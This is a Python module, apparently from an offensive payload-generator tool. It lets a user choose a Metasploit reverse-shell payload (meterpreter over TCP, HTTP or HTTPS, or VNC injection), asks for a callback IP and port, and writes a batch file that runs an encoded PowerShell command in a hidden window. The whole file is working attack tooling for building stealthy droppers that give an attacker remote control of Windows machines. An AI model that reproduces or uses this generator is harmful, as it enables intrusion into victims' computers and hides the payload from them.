#!/usr/bin/python
#
# paygen powershell module

from src.core.main import *
from src.core import menus
from src.ps.psgen import *

while 1:
	try:
		clear()
		menus.ps_moduleInfo()
		
		menus.powershell_menu()
		selection = raw_input(" %sSelection > %s" % (colours.bold, colours.reset))
		if selection == '1' or selection == '':
			payload = 'windows/meterpreter/reverse_tcp'
		elif selection == '2':
			payload = 'windows/x64/meterpreter/reverse_tcp'
		elif selection == '3':
			payload = 'windows/meterpreter/reverse_http'
		elif selection == '4':
			payload = 'windows/meterpreter/reverse_https'
		elif selection == '5':
			payload = 'windows/vncinject/reverse_tcp'
			
		# get some details
		ip, port = connectInfo("r")
			
		# create payload bat file in /tmp
		PrintInfo("Creating output/paygen-pl.bat")
		encCommand = generatePS(payload, ip, port)
		fw = open("output/paygen-pl.bat", "w")
		fw.write("@ECHO OFF\n")
		fw.write("\n")
		fw.write("powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand %s" % encCommand)
		fw.close()

		# Return to main
		EntContinue()
		break
	except KeyboardInterrupt:
		break
